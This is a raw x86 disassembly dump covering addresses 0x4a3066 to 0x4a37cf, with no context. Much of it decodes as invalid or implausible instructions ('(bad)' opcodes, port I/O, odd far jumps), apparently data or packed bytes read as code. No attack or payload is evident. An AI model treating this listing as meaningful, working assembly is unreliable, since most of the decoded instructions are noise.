  4a3066:	data16 or BYTE PTR [ecx-0x4a],ch
  4a306a:	retf   0x66b7
  4a306d:	or     BYTE PTR [ecx-0x7a],ch
  4a3070:	retf   0xcbb8
  4a3073:	or     BYTE PTR [ecx-0x7a],ch
  4a3076:	nop
  4a3077:	mov    ecx,0x8669bacb
  4a307c:	nop
  4a307d:	data16 int3 
  4a307f:	mov    ebx,0x9086bccc
  4a3084:	data16 or ch,cl
  4a3087:	mov    ebp,0x86690cd
  4a308c:	imul   edi,DWORD PTR [esi+0x866bfce],0xc0ce8669
  4a3096:	iret   
  4a3097:	or     BYTE PTR [ecx-0x7a],ch
  4a309a:	nop
  4a309b:	ror    edi,0xc2
  4a309e:	imul   eax,DWORD PTR [esi-0x3c2f9970],0x9086c4d0
  4a30a8:	data16 or cl,dl
  4a30ab:	(bad)
  4a30ae:	data16 or BYTE PTR [ecx-0x3a],ch
  4a30b2:	rol    bh,cl
  4a30b4:	data16 or BYTE PTR [ecx-0x7a],ch
  4a30b8:	ror    al,cl
  4a30ba:	ror    DWORD PTR [eax],cl
  4a30bc:	imul   eax,DWORD PTR [esi-0x352c3670],0x66908669
  4a30c6:	aam    0xcb
  4a30c8:	aam    0xcc
  4a30ca:	xchg   BYTE PTR [eax-0x322af79a],dl
  4a30d0:	aad    0x90
  4a30d2:	data16 or BYTE PTR [ecx-0x32],ch
  4a30d6:	(bad)  
  4a30d7:	iret   
  4a30d8:	add    bh,BYTE PTR [ecx-0x12979f0]
  4a30de:	or     BYTE PTR [ecx+0x2e],bh
  4a30e1:	nop
  4a30e2:	out    0xd7,eax
  4a30e4:	or     bh,dl
  4a30e6:	or     BYTE PTR [esi],ch
  4a30e8:	nop
  4a30e9:	out    0x2,eax
  4a30eb:	fmul   DWORD PTR [eax]
  4a30ed:	fcom   DWORD PTR [eax+0x87902e7]
  4a30f3:	(bad)  [eax]
  4a30f5:	out    0x2,eax
  4a30f7:	jns    0x4a3127
  4a30f9:	fimul  DWORD PTR [eax]
  4a30fb:	fiadd  DWORD PTR [edx]
  4a30fd:	jns    0x4a312d
  4a30ff:	nop
  4a3100:	or     bl,bl
  4a3102:	or     BYTE PTR [ecx+0x2e],bh
  4a3105:	nop
  4a3106:	out    0xdb,eax
  4a3108:	or     ah,bl
  4a310a:	or     BYTE PTR [esi],ch
  4a310c:	nop
  4a310d:	out    0x2,eax
  4a310f:	fmul   QWORD PTR [eax]
  4a3111:	fst    QWORD PTR [eax+0x87902e7]
  4a3117:	fisttp QWORD PTR [eax]
  4a3119:	out    0x2,eax
  4a311b:	jns    0x4a314b
  4a311d:	fimul  WORD PTR [eax]
  4a311f:	fiadd  WORD PTR [edx]
  4a3121:	jns    0x4a3151
  4a3123:	nop
  4a3124:	or     bh,bl
  4a3126:	or     BYTE PTR [ecx+0x2e],bh
  4a3129:	nop
  4a312a:	out    0xdf,eax
  4a312c:	or     al,ah
  4a312e:	or     BYTE PTR [esi],ch
  4a3130:	nop
  4a3131:	out    0x2,eax
  4a3133:	loopne 0x4a313d
  4a3135:	loope  0x4a30c7
  4a3137:	out    0x2,eax
  4a3139:	jns    0x4a3143
  4a313b:	loope  0x4a3145
  4a313d:	out    0x2,eax
  4a313f:	jns    0x4a316f
  4a3141:	loop   0x4a314b
  4a3143:	loop   0x4a3147
  4a3145:	jns    0x4a3175
  4a3147:	nop
  4a3148:	or     bl,ah
  4a314a:	or     BYTE PTR [ecx+0x2e],bh
  4a314d:	nop
  4a314e:	out    0xe3,eax
  4a3150:	or     ah,ah
  4a3152:	or     BYTE PTR [esi],ch
  4a3154:	nop
  4a3155:	out    0x2,eax
  4a3157:	in     al,0x8
  4a3159:	in     eax,0x90
  4a315b:	out    0x2,eax
  4a315d:	jns    0x4a3167
  4a315f:	in     eax,0x8
  4a3161:	out    0x2,eax
  4a3163:	jns    0x4a3193
  4a3165:	out    0x8,al
  4a3167:	out    0x2,al
  4a3169:	jns    0x4a3199
  4a316b:	nop
  4a316c:	or     bh,ah
  4a316e:	or     BYTE PTR [ecx+0x2e],bh
  4a3171:	nop
  4a3172:	out    0xe7,eax
  4a3174:	or     al,ch
  4a3176:	or     BYTE PTR [esi],ch
  4a3178:	nop
  4a3179:	out    0x2,eax
  4a317b:	call   0xe7db1a88
  4a3180:	add    bh,BYTE PTR [ecx+0x8]
  4a3183:	jmp    0x794d1890
  4a3188:	cs jmp 0x902e:0x7902eb08
  4a3190:	or     bl,ch
  4a3192:	or     BYTE PTR [ecx+0x2e],bh
  4a3195:	nop
  4a3196:	out    0xec,eax
  4a3198:	or     ah,ch
  4a319a:	or     BYTE PTR [esi],ch
  4a319c:	nop
  4a319d:	out    0x2,eax
  4a319f:	in     eax,dx
  4a31a0:	or     ch,ch
  4a31a2:	nop
  4a31a3:	out    0x2,eax
  4a31a5:	jns    0x4a31af
  4a31a7:	out    dx,al
  4a31a8:	or     bh,ah
  4a31aa:	add    bh,BYTE PTR [ecx+0x2e]
  4a31ad:	out    dx,al
  4a31ae:	or     bh,ch
  4a31b0:	add    bh,BYTE PTR [ecx+0x2e]
  4a31b3:	nop
  4a31b4:	or     bh,ch
  4a31b6:	or     DWORD PTR [ecx+0x2e],edi
  4a31b9:	nop
  4a31ba:	out    0xf0,eax
  4a31bc:	or     eax,esi
  4a31be:	or     DWORD PTR [esi],ebp
  4a31c0:	nop
  4a31c1:	out    0x2,eax
  4a31c3:	icebp  
  4a31c4:	or     ecx,esi
  4a31c6:	nop
  4a31c7:	out    0x2,eax
  4a31c9:	jns    0x4a31d4
  4a31cb:	repnz or edi,esp
  4a31ce:	add    bh,BYTE PTR [ecx+0x2e]
  4a31d1:	repnz or ebx,esi
  4a31d4:	add    bh,BYTE PTR [ecx+0x2e]
  4a31d7:	nop
  4a31d8:	or     ebx,esi
  4a31da:	or     DWORD PTR [ecx+0x2e],edi
  4a31dd:	nop
  4a31de:	out    0xf4,eax
  4a31e0:	or     esp,esi
  4a31e2:	or     DWORD PTR [esi],ebp
  4a31e4:	nop
  4a31e5:	out    0x2,eax
  4a31e7:	cmc    
  4a31e8:	or     ebp,esi
  4a31ea:	nop
  4a31eb:	out    0x2,eax
  4a31ed:	jns    0x4a31f8
  4a31ef:	test   BYTE PTR [ecx],0xe7
  4a31f2:	add    bh,BYTE PTR [ecx+0x2e]
  4a31f5:	test   BYTE PTR [ecx],0xf7
  4a31f8:	add    bh,BYTE PTR [ecx+0x2e]
  4a31fb:	nop
  4a31fc:	or     edi,esi
  4a31fe:	or     DWORD PTR [ecx+0x2e],edi
  4a3201:	nop
  4a3202:	out    0xf8,eax
  4a3204:	or     eax,edi
  4a3206:	or     DWORD PTR [esi],ebp
  4a3208:	nop
  4a3209:	out    0x2,eax
  4a320b:	stc    
  4a320c:	or     ecx,edi
  4a320e:	nop
  4a320f:	out    0x2,eax
  4a3211:	jns    0x4a321c
  4a3213:	cli    
  4a3214:	or     edi,esp
  4a3216:	add    bh,BYTE PTR [ecx+0x2e]
  4a3219:	sti    
  4a321a:	or     ebx,edi
  4a321c:	or     cl,bl
  4a321e:	cs nop
  4a3220:	or     esp,edi
  4a3222:	cmp    ch,BYTE PTR [eax+0x18]
  4a3225:	sahf   
  4a3226:	inc    ebx
  4a3227:	dec    eax
  4a3228:	mov    WORD PTR gs:[ecx],ds
  4a322b:	adc    ch,bh
  4a322d:	sbb    dl,BYTE PTR [eax]
  4a322f:	push   edx
  4a3230:	sbb    DWORD PTR [edx-0x6c],eax
  4a3233:	sbb    edx,DWORD PTR [esi+eax*4-0x70]
  4a3237:	out    0x18,eax
  4a3239:	(bad)  
  4a323a:	sbb    al,0x9c
  4a323c:	sbb    eax,0x8439e421
  4a3241:	and    bh,bh
  4a3243:	push   ds
  4a3244:	xor    al,0xf
  4a3246:	and    DWORD PTR [ebp+0x281fa4],edx
  4a324c:	inc    ebp
  4a324d:	and    BYTE PTR [ecx],ah
  4a324f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a3250:	xor    al,BYTE PTR [esp+ebp*4+0x210ca921]
  4a3257:	iret   
  4a3258:	xor    BYTE PTR [ecx],al
  4a325a:	and    dh,BYTE PTR [ebx+eiz*1+0x873c843]
  4a3261:	cmp    BYTE PTR [edx],al
  4a3263:	and    al,0xbc
  4a3265:	repnz sbb al,0x42
  4a3268:	sub    ah,BYTE PTR ds:0x87260340
  4a326e:	nop
  4a326f:	retf   0xc410
  4a3272:	daa    
  4a3273:	dec    eax
  4a3274:	add    al,0xa4
  4a3276:	xor    al,BYTE PTR [esp+edi*1+0xc29cc28]
  4a327d:	and    edi,ecx
  4a327f:	and    DWORD PTR [eax+0x5],edx
  4a3282:	sub    dl,ah
  4a3284:	enter  0x873,0xa9
  4a3288:	sub    ebx,DWORD PTR [eax+0x6]
  4a328b:	sub    al,0x1c
  4a328d:	inc    edx
  4a328e:	sub    al,BYTE PTR [ebx-0x24]
  4a3291:	sub    eax,0xca900760
  4a3296:	adc    dl,dh
  4a3298:	cs in  al,0x2f
  4a329b:	xor    al,BYTE PTR [esp+edi*1+0x30086887]
  4a32a2:	in     al,dx
  4a32a3:	and    edi,ecx
  4a32a5:	and    DWORD PTR [ecx+esi*1+0x73320970],esp
  4a32ac:	or     BYTE PTR [ecx+0x7833f40c],ch
  4a32b2:	or     al,BYTE PTR [edx+0x2a]
  4a32b5:	inc    ebx
  4a32b6:	enter  0xfc34,0x35
  4a32ba:	out    0x10,eax
  4a32bc:	repnz sbb al,0x80
  4a32bf:	or     esi,DWORD PTR [esi]
  4a32c1:	add    al,0xc
  4a32c3:	test   BYTE PTR [esi+eax*4-0x70],dl
  4a32c7:	aaa    
  4a32c8:	mov    BYTE PTR [eax],bh
  4a32ca:	xchg   ebp,eax
  4a32cb:	and    esp,esp
  4a32cd:	cmp    DWORD PTR [ecx*1+0x83a9039],ecx
  4a32d4:	jns    0x4a32e4
  4a32d6:	and    DWORD PTR [esi+ecx*1],edx
  4a32d9:	cmp    ebx,DWORD PTR [esi-0x679ab7bd]
  4a32df:	cmp    al,0x1c
  4a32e1:	(bad)  
  4a32e3:	adc    BYTE PTR [edx+0x19],dl
  4a32e6:	inc    edx
  4a32e7:	mov    al,ds:0x9086543e
  4a32ec:	out    0x24,eax
  4a32ee:	adc    BYTE PTR [edi],bh
  4a32f0:	test   al,0x40
  4a32f2:	and    esp,esp
  4a32f4:	cmp    DWORD PTR [esp+ebp*1+0xe794111],eax
  4a32fb:	and    DWORD PTR [ebp+0x123442b0],edx
  4a3301:	inc    ebx
  4a3302:	inc    ebx
  4a3303:	dec    eax
  4a3304:	or     BYTE PTR gs:[eax+0x19523c44],bh
  4a330b:	inc    edx
  4a330c:	sahf   
  4a330d:	adc    eax,DWORD PTR [ebp-0x40]
  4a3310:	inc    esi
  4a3311:	xchg   BYTE PTR [eax+0x144410e7],dl
  4a3317:	inc    edi
  4a3318:	enter  0x39e4,0x84
  4a331c:	push   esp
  4a331d:	dec    eax
  4a331e:	dec    esp
  4a331f:	adc    eax,0x95210e49
  4a3324:	and    eax,edx
  4a3326:	dec    edx
  4a3327:	push   esp
  4a3328:	push   ss
  4a3329:	dec    eax
  4a332a:	or     BYTE PTR gs:[ecx+0x4b],bh
  4a332e:	fmul   DWORD PTR [ecx+ebx*1+0x42]
  4a3332:	sahf   
  4a3333:	inc    ebx
  4a3334:	pop    esp
  4a3335:	pop    ss
  4a3336:	dec    ebp
  4a3337:	loopne 0x4a32c9
  4a3339:	out    0x10,eax
  4a333b:	push   edx
  4a333c:	dec    esi
  4a333d:	sbb    BYTE PTR fs:[edi+0x39],cl
  4a3341:	test   BYTE PTR [esi+eax*4-0x18],dl
  4a3345:	push   eax
  4a3346:	ins    BYTE PTR es:[edi],dx
  4a3347:	sbb    DWORD PTR [ecx],esp
  4a3349:	xchg   ebp,eax
  4a334a:	and    esp,esp
  4a334c:	push   ecx
  4a334d:	lock push edx
  4a334f:	or     BYTE PTR gs:[ecx+0xe],bh
  4a3353:	je     0x4a336f
  4a3355:	push   ebx
  4a3356:	clc    
  4a3357:	inc    edx
  4a3358:	sahf   
  4a3359:	inc    ebx
  4a335a:	dec    eax
  4a335b:	push   esp
  4a335c:	jl     0x4a3379
  4a335e:	push   ebp
  4a335f:	retf   0xf210
  4a3362:	sbb    al,0x0
  4a3364:	sbb    al,0x56
  4a3366:	test   BYTE PTR [esp+edi*1+0x8579087],al
  4a336d:	sbb    eax,0xa421cf58
  4a3372:	xor    cl,BYTE PTR [ecx+ebx*2+0x85a1e10]
  4a3379:	test   eax,0x5b94210c
  4a337e:	sub    al,BYTE PTR [ebx-0x38]
  4a3381:	jae    0x4a339b
  4a3383:	pop    ds
  4a3384:	pop    esp
  4a3385:	pushf  
  4a3386:	pop    ebp
  4a3387:	adc    dl,dh
  4a3389:	sbb    al,0x42
  4a338b:	and    BYTE PTR [eax],ah
  4a338d:	pop    esi
  4a338e:	cmp    al,0x87
  4a3390:	nop
  4a3391:	retf   0x5fa4
  4a3394:	sub    BYTE PTR [ecx],ah
  4a3396:	pusha  
  4a3397:	and    DWORD PTR [edx+esi*1-0x569e537c],esp
  4a339e:	or     al,0x21
  4a33a0:	iret   
  4a33a1:	xor    BYTE PTR [edx],ah
  4a33a3:	bound  esi,QWORD PTR [ebx+eiz*2+0x873c843]
  4a33aa:	cmp    BYTE PTR [ebx],ah
  4a33ac:	fs mov esp,0x2a421cf2
  4a33b2:	gs inc eax
  4a33b4:	and    al,0x66
  4a33b6:	xchg   DWORD PTR [eax+0x67c410ca],edx
  4a33bc:	dec    eax
  4a33bd:	and    eax,0x3c8432a4
  4a33c2:	push   0x210c69cc
  4a33c7:	iret   
  4a33c8:	and    DWORD PTR [eax+0x26],edx
  4a33cb:	push   0xffffffd4
  4a33cd:	enter  0x873,0xa9
  4a33d1:	imul   ebx,DWORD PTR [eax+0x27],0x6c
  4a33d5:	sbb    al,0x42
  4a33d7:	sub    al,BYTE PTR [ebx-0x24]
  4a33da:	ins    DWORD PTR es:[edi],dx
  4a33db:	pusha  
  4a33dc:	sub    BYTE PTR [eax+0x6ef210ca],dl
  4a33e2:	in     al,0x6f
  4a33e4:	xor    al,BYTE PTR [esp+edi*1+0x70296887]
  4a33eb:	in     al,dx
  4a33ec:	and    edi,ecx
  4a33ee:	and    DWORD PTR [ecx+esi*2+0x73722a70],esp
  4a33f5:	or     BYTE PTR [ecx+0x7873f40c],ch
  4a33fb:	sub    eax,DWORD PTR [edx+0x2a]
  4a33fe:	inc    ebx
  4a33ff:	enter  0xfc74,0x75
  4a3403:	out    0x10,eax
  4a3405:	repnz sbb al,0x80
  4a3408:	sub    al,0x76
  4a340a:	add    al,0x2d
  4a340c:	test   BYTE PTR [esi+eax*4-0x70],dl
  4a3410:	ja     0x4a339a
  4a3412:	js     0x4a33a9
  4a3414:	and    esp,esp
  4a3416:	cmp    DWORD PTR [esi+ebp*1],ecx
  4a3419:	jns    0x4a33ab
  4a341b:	jp     0x4a3425
  4a341d:	jns    0x4a342d
  4a341f:	and    DWORD PTR [edi+ebp*1],edx
  4a3422:	jnp    0x4a33c2
  4a3424:	inc    ebx
  4a3425:	dec    eax
  4a3426:	gs cwde 
  4a3428:	jl     0x4a3446
  4a342a:	xor    BYTE PTR [ebp+0x10],bh
  4a342d:	push   edx
  4a342e:	sbb    DWORD PTR [edx-0x60],eax
  4a3431:	jle    0x4a3487
  4a3433:	xchg   BYTE PTR [eax+0x7f3124e7],dl
  4a3439:	test   al,0x80
  4a343b:	and    esp,esp
  4a343d:	cmp    DWORD PTR [esp+ebp*1+0xe798132],eax
  4a3444:	and    DWORD PTR [ebp+0x333482b0],edx
  4a344a:	add    DWORD PTR [ebx+0x48],0x65
  4a344e:	or     BYTE PTR [eax+0x19523c84],bh
  4a3454:	inc    edx
  4a3455:	sahf   
  4a3456:	xor    al,0x85
  4a3458:	rol    BYTE PTR [esi+0x10e79086],0x44
  4a345f:	xor    eax,0x39e4c887
  4a3464:	test   BYTE PTR [eax+ecx*4+0x4c],dl
  4a3468:	mov    DWORD PTR ss:[esi],ecx
  4a346b:	and    DWORD PTR [ebp+0x548ad021],edx
  4a3471:	aaa    
  4a3472:	dec    eax
  4a3473:	or     BYTE PTR gs:[ecx-0x75],bh
  4a3477:	fmul   DWORD PTR [ecx+ebx*1+0x5c439e42]
  4a347e:	cmp    BYTE PTR [ebp+0x10e790e0],cl
  4a3484:	push   edx
  4a3485:	mov    fs,WORD PTR [ecx+edi*1-0x71]
  4a3489:	cmp    DWORD PTR [esp+edx*2+0x6c90e886],eax
  4a3490:	cmp    ah,BYTE PTR [ecx]
  4a3492:	xchg   ebp,eax
  4a3493:	and    esp,esp
  4a3495:	xchg   ecx,eax
  4a3496:	lock xchg edx,eax
  4a3498:	or     BYTE PTR gs:[ecx+0xe],bh
  4a349c:	je     0x4a34d9
  4a349e:	xchg   ebx,eax
  4a349f:	clc    
  4a34a0:	inc    edx
  4a34a1:	sahf   
  4a34a2:	inc    ebx
  4a34a3:	dec    eax
  4a34a4:	xchg   esp,eax
  4a34a5:	jl     0x4a34e3
  4a34a7:	xchg   ebp,eax
  4a34a8:	retf   0xf210
  4a34ab:	sbb    al,0x0
  4a34ad:	cmp    eax,0x3c848496
  4a34b2:	xchg   DWORD PTR [eax-0x67c1f769],edx
  4a34b8:	iret   
  4a34b9:	and    DWORD PTR [edx+esi*1+0x3f10998c],esp
  4a34c0:	call   0x9b94:0x210ca908
  4a34c7:	sub    al,BYTE PTR [ebx-0x38]
  4a34ca:	jae    0x4a34e4
  4a34cc:	inc    eax
  4a34cd:	pushf  
  4a34ce:	pushf  
  4a34cf:	popf   
  4a34d0:	adc    dl,dh
  4a34d2:	sbb    al,0x42
  4a34d4:	and    BYTE PTR [ecx-0x62],al
  4a34d7:	cmp    al,0x87
  4a34d9:	nop
  4a34da:	retf   0x9fa4
  4a34dd:	sub    BYTE PTR [edx-0x60],al
  4a34e0:	and    DWORD PTR [edx+esi*1-0x565e537c],esp
  4a34e7:	or     al,0x21
  4a34e9:	iret   
  4a34ea:	xor    BYTE PTR [ebx-0x5e],al
  4a34ed:	mov    ah,0xa3
  4a34ef:	inc    ebx
  4a34f0:	enter  0x873,0x38
  4a34f4:	inc    esp
  4a34f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a34f6:	mov    esp,0x2a421cf2
  4a34fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a34fc:	inc    eax
  4a34fd:	inc    ebp
  4a34fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a34ff:	xchg   DWORD PTR [eax-0x583bef36],edx
  4a3505:	dec    eax
  4a3506:	inc    esi
  4a3507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a3508:	xor    al,BYTE PTR [esp+edi*1+0xca9cca8]
  4a350f:	and    edi,ecx
  4a3511:	and    DWORD PTR [eax+0x47],edx
  4a3514:	stos   BYTE PTR es:[edi],al
  4a3515:	aam    0xc8
  4a3517:	jae    0x4a3521
  4a3519:	test   eax,0xac4858ab
  4a351e:	sbb    al,0x42
  4a3520:	sub    al,BYTE PTR [ebx-0x24]
  4a3523:	lods   eax,DWORD PTR ds:[esi]
  4a3524:	pusha  
  4a3525:	dec    ecx
  4a3526:	nop
  4a3527:	retf   0xf210
  4a352a:	scas   al,BYTE PTR es:[edi]
  4a352b:	in     al,0xaf
  4a352d:	xor    al,BYTE PTR [esp+edi*1-0x4fb59779]
  4a3534:	in     al,dx
  4a3535:	and    edi,ecx
  4a3537:	and    DWORD PTR [ecx+esi*4+0x73b24b70],esp
  4a353e:	or     BYTE PTR [ecx+0x78b3f40c],ch
  4a3544:	dec    esp
  4a3545:	inc    edx
  4a3546:	sub    al,BYTE PTR [ebx-0x38]
  4a3549:	mov    ah,0xfc
  4a354b:	mov    ch,0xe7
  4a354d:	adc    dl,dh
  4a354f:	sbb    al,0x80
  4a3551:	dec    ebp
  4a3552:	mov    dh,0x4
  4a3554:	dec    esi
  4a3555:	test   BYTE PTR [esi+eax*4-0x70],dl
  4a3559:	mov    bh,0x88
  4a355b:	mov    eax,0x39e42195
  4a3560:	or     al,0x4f
  4a3562:	mov    ecx,0x7908ba90
  4a3567:	push   cs
  4a3568:	and    DWORD PTR [eax+edx*2],edx
  4a356b:	mov    ebx,0x6548439e
  4a3570:	cwde   
  4a3571:	mov    esp,0x10bd511c
  4a3576:	push   edx
  4a3577:	sbb    DWORD PTR [edx-0x60],eax
  4a357a:	mov    esi,0xe7908654
  4a357f:	and    al,0x52
  4a3581:	mov    edi,0xe421c0a8
  4a3586:	cmp    DWORD PTR [esp+ebp*1+0xe79c153],eax
  4a358d:	and    DWORD PTR [ebp+0x5434c2b0],edx
  4a3593:	ret    
  4a3594:	inc    ebx
  4a3595:	dec    eax
  4a3596:	or     BYTE PTR gs:[eax+0x19523cc4],bh
  4a359d:	inc    edx
  4a359e:	sahf   
  4a359f:	push   ebp
  4a35a0:	vshufps xmm0,xmm7,XMMWORD PTR [esi+0x4410e790],0x56
  4a35a9:	(bad)  
  4a35aa:	enter  0x39e4,0x84
  4a35ae:	push   esp
  4a35af:	enter  0x574c,0xc9
  4a35b3:	push   cs
  4a35b4:	and    DWORD PTR [ebp+0x54cad021],edx
  4a35ba:	pop    eax
  4a35bb:	dec    eax
  4a35bc:	or     BYTE PTR gs:[ecx-0x35],bh
  4a35c0:	fmul   st,st(4)
  4a35c2:	sbb    DWORD PTR [edx-0x62],eax
  4a35c5:	inc    ebx
  4a35c6:	pop    esp
  4a35c7:	pop    ecx
  4a35c8:	int    0xe0
  4a35ca:	nop
  4a35cb:	out    0x10,eax
  4a35cd:	push   edx
  4a35ce:	into   
  4a35cf:	fs pop edx
  4a35d1:	iret   
  4a35d2:	cmp    DWORD PTR [esp+edx*2+0x6cd0e886],eax
  4a35d9:	pop    ebx
  4a35da:	and    DWORD PTR [ebp-0xf2e1bdf],edx
  4a35e0:	shl    BYTE PTR [ebp+0x8],cl
  4a35e3:	jns    0x4a35f3
  4a35e5:	je     0x4a3643
  4a35e7:	sar    eax,cl
  4a35e9:	inc    edx
  4a35ea:	sahf   
  4a35eb:	inc    ebx
  4a35ec:	dec    eax
  4a35ed:	aam    0x7c
  4a35ef:	pop    ebp
  4a35f0:	aad    0xca
  4a35f2:	adc    dl,dh
  4a35f4:	sbb    al,0x0
  4a35f6:	pop    esi
  4a35f7:	(bad)  
  4a35f8:	test   BYTE PTR [esp+edi*1+0x8d79087],al
  4a35ff:	pop    edi
  4a3600:	fmul   st,st(7)
  4a3602:	and    DWORD PTR [edx+esi*1+0x6010d98c],esp
  4a3609:	fimul  DWORD PTR [eax]
  4a360b:	test   eax,0xdb94210c
  4a3610:	sub    al,BYTE PTR [ebx-0x38]
  4a3613:	jae    0x4a362d
  4a3615:	popa   
  4a3616:	fcomp  QWORD PTR [ebp+ebx*8+0x421cf210]
  4a361d:	and    BYTE PTR [edx-0x22],ah
  4a3620:	cmp    al,0x87
  4a3622:	nop
  4a3623:	retf   0xdfa4
  4a3626:	sub    BYTE PTR [ebx-0x20],ah
  4a3629:	and    DWORD PTR [edx+esi*1-0x561e537c],esp
  4a3630:	or     al,0x21
  4a3632:	iret   
  4a3633:	xor    BYTE PTR [edx+eiz*8-0x4c],ah
  4a3637:	jecxz  0x4a367c
  4a3639:	enter  0x873,0x38
  4a363d:	gs in  al,0xbc
  4a3640:	repnz sbb al,0x42
  4a3643:	sub    ah,ch
  4a3645:	inc    eax
  4a3646:	data16 out 0x87,al
  4a3649:	nop
  4a364a:	retf   0xc410
  4a364d:	out    0x48,eax
  4a364f:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4a3651:	xor    al,BYTE PTR [esp+edi*1+0xce9cce8]
  4a3658:	and    edi,ecx
  4a365a:	and    DWORD PTR [eax+0x68],edx
  4a365d:	jmp    0xeba9:0x873c8d4
  4a3664:	pop    eax
  4a3665:	imul   ebp,esp,0x432a421c
  4a366b:	fsub   st(5),st
  4a366d:	pusha  
  4a366e:	push   0xffffff90
  4a3670:	retf   0xf210
  4a3673:	out    dx,al
  4a3674:	in     al,0xef
  4a3676:	xor    al,BYTE PTR [esp+edi*1-0xf949779]
  4a367d:	in     al,dx
  4a367e:	and    edi,ecx
  4a3680:	and    DWORD PTR [ecx+esi*8+0x73f26c70],esp
  4a3687:	or     BYTE PTR [ecx+0x78f3f40c],ch
  4a368d:	ins    DWORD PTR es:[edi],dx
  4a368e:	inc    edx
  4a368f:	sub    al,BYTE PTR [ebx-0x38]
  4a3692:	hlt    
  4a3693:	cld    
  4a3694:	cmc    
  4a3695:	out    0x10,eax
  4a3697:	repnz sbb al,0x80
  4a369a:	outs   dx,BYTE PTR ds:[esi]
  4a369b:	test   BYTE PTR [edi+ebp*2],0x84
  4a369f:	push   esp
  4a36a0:	xchg   BYTE PTR [eax-0x6a077709],dl
  4a36a6:	and    esp,esp
  4a36a8:	cmp    DWORD PTR [eax+esi*2],ecx
  4a36ab:	stc    
  4a36ac:	nop
  4a36ad:	cli    
  4a36ae:	or     BYTE PTR [ecx+0xe],bh
  4a36b1:	and    DWORD PTR [ecx+esi*2],edx
  4a36b4:	sti    
  4a36b5:	sahf   
  4a36b6:	inc    ebx
  4a36b7:	dec    eax
  4a36b8:	gs cwde 
  4a36ba:	cld    
  4a36bb:	sbb    al,0x72
  4a36bd:	std    
  4a36be:	adc    BYTE PTR [edx+0x19],dl
  4a36c1:	inc    edx
  4a36c2:	mov    al,ds:0x908656fe
  4a36c7:	out    0x24,eax
  4a36c9:	jae    0x4a36ca
  4a36cb:	test   al,0x0
  4a36cd:	or     dl,BYTE PTR [eax]
  4a36cf:	repnz mov esp,0x1742c40
  4a36d5:	cmp    al,0x87
  4a36d7:	nop
  4a36d8:	retf   0x2b0
  4a36db:	xor    al,0x75
  4a36dd:	add    esp,DWORD PTR [ecx]
  4a36df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a36e0:	xor    al,BYTE PTR [eax+edi*4+0x210ca904]
  4a36e7:	iret   
  4a36e8:	cmp    al,0x76
  4a36ea:	add    eax,0xc84306c0
  4a36ef:	jae    0x4a36f9
  4a36f1:	inc    esp
  4a36f2:	ja     0x4a36fb
  4a36f4:	enter  0x1cf2,0x42
  4a36f8:	sub    cl,BYTE PTR [eax]
  4a36fa:	dec    esp
  4a36fb:	js     0x4a3706
  4a36fd:	xchg   DWORD PTR [eax+0xad010ca],edx
  4a3703:	push   esp
  4a3704:	jns    0x4a36aa
  4a3706:	xor    al,BYTE PTR [esp+edi*1+0xc0cd80b]
  4a370d:	and    edi,ecx
  4a370f:	and    DWORD PTR [edx+edi*2+0xd],ebx
  4a3713:	loopne 0x4a36dd
  4a3715:	jae    0x4a371f
  4a3717:	test   eax,0xf7b640e
  4a371c:	sbb    al,0x42
  4a371e:	sub    al,BYTE PTR [ebx-0x18]
  4a3721:	adc    BYTE PTR [esp+edi*2-0x70],ch
  4a3725:	retf   0xf210
  4a3728:	adc    eax,esi
  4a372a:	adc    dh,BYTE PTR [edx]
  4a372c:	test   BYTE PTR [edi+eax*4],bh
  4a372f:	je     0x4a37ae
  4a3731:	adc    edi,eax
  4a3733:	and    edi,ecx
  4a3735:	and    DWORD PTR [esp+edx*1+0x65157e7c],esp
  4a373c:	or     BYTE PTR [ecx+0xe],bh
  4a373f:	add    BYTE PTR [edi+0x16],bh
  4a3742:	test   BYTE PTR [edx-0x62],al
  4a3745:	inc    ebx
  4a3746:	dec    eax
  4a3747:	pop    ss
  4a3748:	or     BYTE PTR [eax+0x5210e718],al
  4a374e:	sbb    DWORD PTR [ecx+ebx*1+0x54848110],ecx
  4a3755:	xchg   BYTE PTR [eax-0x6ae46be6],dl
  4a375b:	and    esp,esp
  4a375d:	cmp    DWORD PTR [eax],ebx
  4a375f:	sbb    BYTE PTR [esp+ebx*4],0x1d
  4a3763:	or     BYTE PTR [ecx+0xe],bh
  4a3766:	and    DWORD PTR [eax],esp
  4a3768:	sbb    DWORD PTR [esi],0xffffff9e
  4a376b:	inc    ebx
  4a376c:	dec    eax
  4a376d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4a376f:	pop    ds
  4a3770:	sub    BYTE PTR [eax+eiz*1+0x42195210],al
  4a3777:	lods   al,BYTE PTR ds:[esi]
  4a3778:	and    DWORD PTR [esi+eax*4-0x70],edx
  4a377c:	out    0x30,eax
  4a377e:	test   DWORD PTR [edx],esp
  4a3780:	mov    ah,0x23
  4a3782:	and    esp,esp
  4a3784:	cmp    DWORD PTR [eax+edi*1+0xe792486],eax
  4a378b:	and    DWORD PTR [ebp-0x78bfda44],edx
  4a3791:	es inc ebx
  4a3793:	dec    eax
  4a3794:	gs or  ah,al
  4a3797:	daa    
  4a3798:	dec    eax
  4a3799:	push   edx
  4a379a:	sbb    DWORD PTR [edx-0x62],eax
  4a379d:	mov    BYTE PTR [eax],ch
  4a379f:	int3   
  4a37a0:	sub    DWORD PTR [esi+0x5010e790],eax
  4a37a6:	mov    DWORD PTR [edx],ebp
  4a37a8:	aam    0xe4
  4a37aa:	cmp    DWORD PTR [esp+edx*2+0x2c8a582b],eax
  4a37b1:	push   cs
  4a37b2:	and    DWORD PTR [ebp+0x602ddc21],edx
  4a37b8:	mov    ecx,DWORD PTR [eax+0x65]
  4a37bb:	or     BYTE PTR [ecx+0x2e],bh
  4a37be:	in     al,0x2f
  4a37c0:	sbb    DWORD PTR [edx-0x62],eax
  4a37c3:	inc    ebx
  4a37c4:	push   0x90ec308c
  4a37c9:	out    0x10,eax
  4a37cb:	push   edx
  4a37cc:	xor    DWORD PTR [eax-0x73],esi
  4a37cf:	xor    bh,BYTE PTR [ecx]
